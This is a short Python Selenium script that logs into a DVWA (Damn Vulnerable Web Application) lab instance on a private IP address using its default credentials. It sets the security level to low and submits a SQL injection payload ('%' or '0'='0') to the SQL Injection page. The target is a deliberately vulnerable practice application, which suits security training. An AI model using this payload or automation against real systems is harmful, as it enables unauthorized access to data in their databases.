from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select

import time


URL='http://192.168.183.128/dvwa/login.php'

# driver = webdriver.Firefox('geckodriver')
driver = webdriver.Chrome('chromedriver.exe')
driver.get(URL)

user = driver.find_element(By.NAME, 'username')
user.send_keys('admin')
time.sleep(3)
password = driver.find_element(By.NAME, 'password')
password.send_keys('password')
login_btn = driver.find_element(By.NAME, 'Login')
login_btn.click()
time.sleep(3)
driver.find_element(By.LINK_TEXT, 'DVWA Security').click() 
select = Select(driver.find_element(By.NAME, 'security'))
select.select_by_visible_text('low')
time.sleep(3)
driver.find_element(By.NAME, 'seclev_submit').click()


driver.find_element(By.LINK_TEXT, 'SQL Injection').click()
driver.find_element(By.NAME, 'id').send_keys("%' or '0'='0")
time.sleep(3)
submit_btn = driver.find_element(By.NAME, 'Submit')
submit_btn.click()
time.sleep(7)

#URL2=' sql query '
#driver.get(URL2)

# driver.close()











